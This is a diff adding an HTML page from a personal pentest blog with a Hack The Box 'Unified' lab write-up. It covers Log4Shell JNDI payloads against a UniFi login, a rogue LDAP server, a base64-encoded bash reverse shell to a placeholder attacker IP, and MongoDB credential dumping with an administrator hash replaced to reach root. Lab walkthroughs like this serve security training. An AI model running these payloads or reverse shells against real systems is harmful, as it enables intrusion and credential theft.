@@ -1,0 +1,690 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Hack The Box Unified — RootDas Pentest Book</title>
+  
+  <!-- CSS -->
+  <link rel="stylesheet" href="/styles/main.css">
+  <link rel="stylesheet" href="/styles/sidebar.css">
+  <link rel="stylesheet" href="/styles/right-sidebar.css">
+  <link rel="stylesheet" href="/styles/cards.css">
+  <link rel="stylesheet" href="/styles/markdown.css">
+  <link rel="stylesheet" href="/styles/responsive.css">
+
+  <!-- Google Fonts -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+  <!-- Syntax Highlighting -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/tokyo-night-dark.min.css">
+  
+  <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Hack The Box Unified | RootDas Pentest Book</title>
+<meta name="generator" content="Jekyll v4.4.1" />
+<meta property="og:title" content="Hack The Box Unified" />
+<meta name="author" content="Luiz Kelme" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="🛡 Unified – Penetration Test Report" />
+<meta property="og:description" content="🛡 Unified – Penetration Test Report" />
+<link rel="canonical" href="http://localhost:4000/writeups/hackthebox/unified/" />
+<meta property="og:url" content="http://localhost:4000/writeups/hackthebox/unified/" />
+<meta property="og:site_name" content="RootDas Pentest Book" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2026-04-18T00:00:00-03:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Hack The Box Unified" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Luiz Kelme"},"dateModified":"2026-04-18T00:00:00-03:00","datePublished":"2026-04-18T00:00:00-03:00","description":"🛡 Unified – Penetration Test Report","headline":"Hack The Box Unified","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/writeups/hackthebox/unified/"},"url":"http://localhost:4000/writeups/hackthebox/unified/"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+<body>
+  <div class="layout">
+    <!-- Left Sidebar -->
+<aside class="sidebar">
+  <div class="profile">
+    <img src="/assets/avatar.jpg" alt="Foto de perfil">
+    <h2>RootDas Pentest book</h2>
+    <p>Cybersecurity & Pentest</p>
+  </div>
+
+  <nav class="menu">
+    <a href="/" >
+      🏠 Home
+    </a>
+    <a href="/writeups.html" class="active">
+      🧠 Write-ups
+    </a>
+    <a href="/projects.html" >
+      📁 Projects
+    </a>
+    <a href="/about.html" >
+      👤 Sobre
+    </a>
+  </nav>
+
+  <footer class="sidebar-footer">
+    <p>© 2025 RootDas</p>
+  </footer>
+</aside>
+    
+    <main class="content">
+      <div class="writeup-wrapper">
+  <nav class="breadcrumb">
+    <a href="/">Home</a>
+    <span class="separator">/</span>
+    <a href="/writeups.html">Write-ups</a>
+    <span class="separator">/</span>
+    <span class="current">Hack The Box Unified</span>
+  </nav>
+
+  <div class="writeup-container">
+    <article class="writeup-main">
+      <header class="writeup-header">
+        <div class="header-badge">
+          <span class="platform-badge">Hack The Box</span>
+          <span class="difficulty-badge difficulty-very easy">
+            Very Easy
+          </span>
+        </div>
+
+        <h1 class="writeup-title">
+          <span class="title-icon">🔒</span>
+          <span>Hack The Box Unified</span>
+        </h1>
+
+        <div class="writeup-meta">
+          <div class="meta-card">
+            <span class="meta-label">Sistema</span>
+            <span class="meta-value">Linux</span>
+          </div>
+
+          <div class="meta-card">
+            <span class="meta-label">Data</span>
+            <span class="meta-value">18/04/2026</span>
+          </div>
+
+          <div class="meta-card">
+            <span class="meta-label">Categoria</span>
+            <span class="meta-value">Hack the Box</span>
+          </div>
+        </div>
+
+        
+        <div class="writeup-tags">
+          
+        </div>
+        
+      </header>
+
+      <hr class="divider">
+
+      <div class="writeup-content markdown-body">
+        <h1 id="-unified--penetration-test-report">🛡 Unified – Penetration Test Report</h1>
+
+<hr />
+
+<h1 id="-objective">🎯 Objective</h1>
+
+<p>The objective of this assessment was to identify vulnerabilities in the target system, obtain initial access, perform privilege escalation, and achieve full administrative control over the host.</p>
+
+<hr />
+
+<h1 id="-target-information">🖥 Target Information</h1>
+
+<ul>
+  <li><strong>Target IP:</strong> 10.129.4.149</li>
+  <li><strong>Operating System:</strong> Linux</li>
+</ul>
+
+<h2 id="exposed-services">Exposed Services</h2>
+
+<ul>
+  <li>SSH (22)</li>
+  <li>IBM DB2 Admin (6789)</li>
+  <li>HTTP (8080 – Apache Tomcat)</li>
+  <li>HTTPS (8443 – UniFi Network)</li>
+</ul>
+
+<p>The web application running on port <strong>8443</strong> was identified as:</p>
+
+<ul>
+  <li><strong>UniFi Network 6.4.54</strong> by Ubiquiti Inc.</li>
+</ul>
+
+<hr />
+
+<h1 id="-enumeration">🔎 Enumeration</h1>
+
+<h2 id="nmap-scan">Nmap Scan</h2>
+
+<p>We begin with the standard approach by performing service and version detection:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-Pn</span> 10.129.4.149
+</code></pre></div></div>
+
+<h3 id="open-ports-identified">Open Ports Identified</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>Port</th>
+      <th>Service</th>
+      <th>Version</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>22</td>
+      <td>SSH</td>
+      <td>OpenSSH 8.2p1</td>
+    </tr>
+    <tr>
+      <td>6789</td>
+      <td>ibm-db2-admin</td>
+      <td>Unknown</td>
+    </tr>
+    <tr>
+      <td>8080</td>
+      <td>HTTP</td>
+      <td>Apache Tomcat</td>
+    </tr>
+    <tr>
+      <td>8443</td>
+      <td>HTTPS</td>
+      <td>UniFi Network</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>The HTTP service on port <strong>8080</strong> redirects to:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://10.129.4.149:8443/manage
+</code></pre></div></div>
+
+<p>Service detection performed. Please report incorrect results at:
+https://nmap.org/submit/</p>
+
+<p>Nmap done: 1 IP address (1 host up) scanned in 211.42 seconds.</p>
+
+<p>We begin web enumeration. The service on port 8080 (Tomcat) redirects to port 8443, where we find the UniFi Network login page.</p>
+
+<p><img src="/assets/writeups/unified/image.png" alt="image.png" /></p>
+
+<hr />
+
+<h2 id="web-enumeration">Web Enumeration</h2>
+
+<p>Directory brute-forcing:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster <span class="nb">dir</span> <span class="nt">-u</span> https://10.129.4.149:8443 <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/common.txt <span class="nt">-k</span>
+</code></pre></div></div>
+
+<p>All discovered endpoints required authentication, so the focus shifted to the login functionality.</p>
+
+<p>The login page revealed:</p>
+
+<ul>
+  <li><strong>UniFi Network Version 6.4.54</strong></li>
+</ul>
+
+<p><img src="/assets/writeups/unified/image1.png" alt="image.png" /></p>
+
+<hr />
+
+<h1 id="-identified-vulnerability">🚨 Identified Vulnerability</h1>
+
+<h2 id="cve-2021-44228--log4shell">CVE-2021-44228 — Log4Shell</h2>
+
+<p>During enumeration, we identified that the target application was running a vulnerable version of Log4j.</p>
+
+<p>The application is affected by <strong>CVE-2021-44228</strong>, known as <strong>Log4Shell</strong>, a critical Remote Code Execution (RCE) vulnerability in the Apache Log4j logging library.</p>
+
+<p>Log4j is a widely used Java-based logging framework embedded in numerous enterprise systems, making this vulnerability extremely impactful.</p>
+
+<hr />
+
+<h2 id="-technical-overview">🔎 Technical Overview</h2>
+
+<p>Log4Shell arises from Log4j’s support for message lookups via JNDI.</p>
+
+<p>Example payload:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>${jndi:ldap://attacker.com/payload}
+</code></pre></div></div>
+
+<p>When processed:</p>
+
+<ol>
+  <li>Log4j interprets the lookup string</li>
+  <li>Performs JNDI resolution</li>
+  <li>Connects to an attacker-controlled LDAP/RMI server</li>
+  <li>Loads a remote Java class</li>
+  <li>Executes arbitrary code</li>
+</ol>
+
+<p>This results in <strong>unauthenticated Remote Code Execution (RCE)</strong>.</p>
+
+<hr />
+
+<h2 id="️-security-impact">⚠️ Security Impact</h2>
+
+<ul>
+  <li>Remote JNDI lookups</li>
+  <li>Remote class loading</li>
+  <li>Arbitrary command execution</li>
+  <li>Full system compromise</li>
+</ul>
+
+<hr />
+
+<h1 id="-exploitation">💣 Exploitation</h1>
+
+<h2 id="-initial-access">🚪 Initial Access</h2>
+
+<h2 id="intercepting-authentication-requests">Intercepting Authentication Requests</h2>
+
+<p>Using <strong>Burp Suite</strong>, we intercepted the request to:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/api/login
+</code></pre></div></div>
+
+<p><img src="/assets/writeups/unified/image-2.png" alt="teste.png" /></p>
+
+<p>The request body was JSON and contained a parameter named <code class="language-plaintext highlighter-rouge">remember</code>.</p>
+
+<p>This parameter is processed and logged by the backend, making it a suitable injection point.</p>
+
+<hr />
+
+<h2 id="-jndi-injection">🧨 JNDI Injection</h2>
+
+<p>Payload used:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>${jndi:ldap://ATTACKER-IP/test}
+</code></pre></div></div>
+
+<p>Injected request:</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+  </span><span class="nl">"username"</span><span class="p">:</span><span class="w"> </span><span class="s2">"admin"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"password"</span><span class="p">:</span><span class="w"> </span><span class="s2">"admin"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"remember"</span><span class="p">:</span><span class="w"> </span><span class="s2">"${jndi:ldap://ATTACKER-IP/test}"</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>The payload is wrapped in quotes to ensure proper JSON parsing.</p>
+
+<hr />
+
+<h2 id="-understanding-the-components">🔎 Understanding the Components</h2>
+
+<h3 id="jndi">JNDI</h3>
+
+<p>Java Naming and Directory Interface allows applications to locate external resources.</p>
+
+<p>When processing <code class="language-plaintext highlighter-rouge">${jndi:...}</code>, Log4j initiates an outbound connection.</p>
+
+<hr />
+
+<h3 id="ldap">LDAP</h3>
+
+<p>Lightweight Directory Access Protocol is used to deliver malicious Java classes in this exploit.</p>
+
+<hr />
+
+<h2 id="-exploitation-logic">🎯 Exploitation Logic</h2>
+
+<p>The attack flow:</p>
+
+<ol>
+  <li>Inject payload into logged input</li>
+  <li>Trigger Log4j lookup</li>
+  <li>Force connection to attacker LDAP server</li>
+  <li>Confirm vulnerability</li>
+</ol>
+
+<p>Even without RCE, an LDAP callback confirms the injection point.</p>
+
+<p><img src="/assets/writeups/unified/write_up_unified(response_burp).png" alt="write up unified(response burp).png" /></p>
+
+<hr />
+
+<h2 id="-out-of-band-confirmation">🔎 Out-of-Band Confirmation</h2>
+
+<p>We monitor LDAP traffic:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>tcpdump <span class="nt">-i</span> tun0 port 389
+</code></pre></div></div>
+
+<p><img src="/assets/writeups/unified/image-3.png" alt="image.png" /></p>
+
+<p>This confirms:</p>
+
+<ul>
+  <li>Input is logged</li>
+  <li>Log4j processes payload</li>
+  <li>JNDI resolution occurs</li>
+</ul>
+
+<hr />
+
+<h2 id="-rogue-jndi-setup">🧨 Rogue JNDI Setup</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/veracode-research/rogue-jndi
+<span class="nb">cd </span>rogue-jndi
+mvn package
+</code></pre></div></div>
+
+<p>Generated file:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>target/RogueJndi-1.1.jar
+</code></pre></div></div>
+
+<p><img src="/assets/writeups/unified/image-4.png" alt="image.png" /></p>
+
+<p>This acts as a malicious LDAP server.</p>
+
+<hr />
+
+<h2 id="-reverse-shell-payload">🧠 Reverse Shell Payload</h2>
+
+<p>Original payload:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/IP/PORT 0&gt;&amp;1
+</code></pre></div></div>
+
+<p>Encoded:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s1">'bash -c bash -i &gt;&amp; /dev/tcp/IP/4114 0&gt;&amp;1'</span> | <span class="nb">base64</span>
+</code></pre></div></div>
+
+<p>Execution chain:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash <span class="nt">-c</span> <span class="o">{</span><span class="nb">echo</span>,BASE64<span class="o">}</span>|<span class="o">{</span><span class="nb">base64</span>,-d<span class="o">}</span>|<span class="o">{</span>bash,-i<span class="o">}</span>
+</code></pre></div></div>
+
+<p><img src="/assets/writeups/unified/image-5.png" alt="image.png" /></p>
+
+<hr />
+
+<h2 id="-launching-roguejndi">🚀 Launching RogueJNDI</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>java <span class="nt">-jar</span> target/RogueJndi-1.1.jar <span class="se">\</span>
+<span class="nt">--command</span> <span class="s2">"bash -c {echo,BASE64}|{base64,-d}|{bash,-i}"</span> <span class="se">\</span>
+<span class="nt">--hostname</span> YOUR-IP
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="-listener">🎧 Listener</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvnp</span> 4114
+</code></pre></div></div>
+
+<p>Trigger payload:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>${jndi:ldap://ATTACKER-IP:1389/o=tomcat}
+</code></pre></div></div>
+
+<p><img src="/assets/writeups/unified/image-7.png" alt="image.png" /></p>
+
+<p>Reverse shell received.</p>
+
+<hr />
+
+<h2 id="-shell-stabilization">🖥 Shell Stabilization</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>script /dev/null <span class="nt">-c</span> bash
+</code></pre></div></div>
+
+<p>User flag found in:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/home/michael
+</code></pre></div></div>
+
+<p><img src="/assets/writeups/unified/image-8.png" alt="image.png" /></p>
+
+<hr />
+
+<h1 id="-post-exploitation">🔐 Post-Exploitation</h1>
+
+<h2 id="mongodb-enumeration">MongoDB Enumeration</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ps aux | <span class="nb">grep </span>mongo
+</code></pre></div></div>
+
+<p>MongoDB running on:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>27117
+</code></pre></div></div>
+
+<p><img src="/assets/writeups/unified/image-9.png" alt="image.png" /></p>
+
+<hr />
+
+<h2 id="database-access">Database Access</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mongo <span class="nt">--port</span> 27117
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use ace
+</code></pre></div></div>
+
+<p><img src="/assets/writeups/unified/image-10.png" alt="image.png" /></p>
+
+<hr />
+
+<h2 id="credential-dump">Credential Dump</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mongo <span class="nt">--port</span> 27117 <span class="nt">--quiet</span> <span class="nt">--eval</span> <span class="s1">'db.admin.find().forEach(printjson)'</span> ace <span class="o">&gt;</span> admin_dump.txt
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>more admin_dump.txt
+</code></pre></div></div>
+
+<p><img src="/assets/writeups/unified/image-11.png" alt="image.png" /></p>
+
+<hr />
+
+<h2 id="extracting-credentials">Extracting Credentials</h2>
+
+<p>Hash found:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.
+</code></pre></div></div>
+
+<ul>
+  <li>SHA-512 crypt format</li>
+  <li>Same as <code class="language-plaintext highlighter-rouge">/etc/shadow</code></li>
+</ul>
+
+<hr />
+
+<h2 id="-privilege-escalation-strategy">🎯 Privilege Escalation Strategy</h2>
+
+<h3 id="option-1--crack-hash">Option 1 — Crack Hash</h3>
+
+<p>Using tools like John the Ripper.</p>
+
+<h3 id="option-2--replace-hash-chosen">Option 2 — Replace Hash (Chosen)</h3>
+
+<p>Generate new hash:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl passwd <span class="nt">-6</span> admin123
+</code></pre></div></div>
+
+<p>Update database:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mongo <span class="nt">--port</span> 27117 ace <span class="nt">--quiet</span> <span class="nt">--eval</span> <span class="s1">'db.admin.update({name:"administrator"},{$set:{x_shadow:"NEW_HASH"}})'</span>
+</code></pre></div></div>
+
+<p><img src="/assets/writeups/unified/image-12.png" alt="image.png" />
+<img src="/assets/writeups/unified/image-13.png" alt="image.png" /></p>
+
+<hr />
+
+<h2 id="-administrator-access">🔓 Administrator Access</h2>
+
+<p>Login successful:</p>
+
+<p><img src="/assets/writeups/unified/image-14.png" alt="image.png" />
+<img src="/assets/writeups/unified/image-15.png" alt="image.png" /></p>
+
+<p>Root credentials found in settings:</p>
+
+<p><img src="/assets/writeups/unified/image-16.png" alt="image.png" /></p>
+
+<hr />
+
+<h2 id="-root-access">👑 Root Access</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh root@10.129.1.13
+</code></pre></div></div>
+
+<p><img src="/assets/writeups/unified/image-17.png" alt="image.png" /></p>
+
+<hr />
+
+<h2 id="-conclusion">🏁 Conclusion</h2>
+
+<ul>
+  <li>Log4Shell RCE exploited</li>
+  <li>Reverse shell obtained</li>
+  <li>MongoDB credentials extracted</li>
+  <li>Privilege escalation achieved</li>
+  <li>Root access obtained</li>
+</ul>
+
+      </div>
+    </article>
+
+    <aside class="writeup-sidebar">
+      <div class="sidebar-card info-box">
+        <h3 class="sidebar-title">Informações</h3>
+
+        <div class="info-grid">
+          <div class="info-row">
+            <span class="info-label">Plataforma</span>
+            <span class="info-value">Hack The Box</span>
+          </div>
+
+          <div class="info-row">
+            <span class="info-label">Dificuldade</span>
+            <span class="info-value difficulty-very easy">
+              Very Easy
+            </span>
+          </div>
+
+          <div class="info-row">
+            <span class="info-label">Sistema</span>
+            <span class="info-value">Linux</span>
+          </div>
+
+          <div class="info-row">
+            <span class="info-label">Data</span>
+            <span class="info-value">18/04/2026</span>
+          </div>
+        </div>
+      </div>
+
+      
+      <div class="sidebar-card tags-box">
+        <h3 class="sidebar-title">Tags</h3>
+        <div class="tags-list">
+          
+        </div>
+      </div>
+      
+    </aside>
+  </div>
+</div>
+    </main>
+    
+    <!-- Right Sidebar (dentro da .layout) -->
+<aside class="right-sidebar">
+  <h3>⚙️ Stack Tecnológica</h3>
+
+  <div class="tech-grid">
+
+    <!-- 1 -->
+    <div class="tech-card">
+      <div class="icon">🔍</div>
+      <h4>Wazuh</h4>
+      <p>SIEM & XDR</p>
+    </div>
+
+    <!-- 2 -->
+    <div class="tech-card">
+      <div class="icon">🧠</div>
+      <h4>Wireshark</h4>
+      <p>Análise de Tráfego</p>
+    </div>
+
+    <!-- 3 -->
+    <div class="tech-card">
+      <div class="icon">🛡️</div>
+      <h4>Burp Suite</h4>
+      <p>Web Security</p>
+    </div>
+
+    <!-- 4 -->
+    <div class="tech-card">
+      <div class="icon">🐝</div>
+      <h4>TheHive</h4>
+      <p>Incident Response</p>
+    </div>
+
+    <!-- 5 -->
+    <div class="tech-card">
+      <div class="icon">🌐</div>
+      <h4>Nmap</h4>
+      <p>Reconhecimento</p>
+    </div>
+
+    <!-- 6 -->
+    <div class="tech-card">
+      <div class="icon">📈</div>
+      <h4>Grafana</h4>
+      <p>Monitoramento</p>
+    </div>
+
+    <!-- 7 -->
+    <div class="tech-card">
+      <div class="icon">💀</div>
+      <h4>Metasploit</h4>
+      <p>Exploitation</p>
+    </div>
+
+    <!-- 8 -->
+    <div class="tech-card">
+      <div class="icon">🐍</div>
+      <h4>Python</h4>
+      <p>Programação</p>
+    </div>
+
+    <!-- 9 -->
+    <div class="tech-card">
+      <div class="icon">💻</div>
+      <h4>Bash</h4>
+      <p>Scripting</p>
+    </div>
+
+    <!-- 10 -->
+    <div class="tech-card">
+      <div class="icon">📊</div>
+      <h4>Elastic Stack</h4>
+      <p>Log Analysis</p>
+    </div>
+
+  </div>
+</aside>
+  </div>
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+</body>
+</html>
